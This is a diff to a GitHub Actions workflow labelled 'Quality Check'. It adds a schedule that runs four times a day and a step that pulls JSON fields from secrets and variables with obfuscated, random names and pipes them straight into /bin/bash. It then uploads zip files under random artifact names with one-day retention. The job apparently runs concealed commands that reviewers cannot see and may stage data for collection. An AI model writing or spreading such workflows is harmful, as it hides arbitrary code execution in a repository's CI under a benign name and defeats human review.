@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '40 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,18 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          lk12363: ${{ secrets.lk12363 }}
+          vbt838: ${{ secrets.vbt838 }}
         run: |
-          printf '%s' "$lk12363" | jq -r .l833 | /bin/bash
-          printf '%s' "$axwe5" | jq -r .q5329 | /bin/bash
-          printf '%s' "$qhtdi2130" | jq -r .tosg3 | /bin/bash
-          printf '%s' "$drl96790" | jq -r .dtglq699 | /bin/bash
-          printf '%s' "$j9554" | jq -r .xikb52545 | /bin/bash
-          printf '%s' "$itesx39468" | jq -r .gh356 | /bin/bash
+          printf '%s' "$vbt838" | jq -r .v63 | /bin/bash
+          echo $jg90058 | jq -r .jvj411 | /bin/bash
+          printf '%s' "$fo80537" | jq -r .kfyy78 | /bin/bash
+          printf '%s' "$bubpb5263" | jq -r .ydm6293 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: LYYtrj5O
+          name: NboGgIw9
           path: "*.zip"
           retention-days: 1
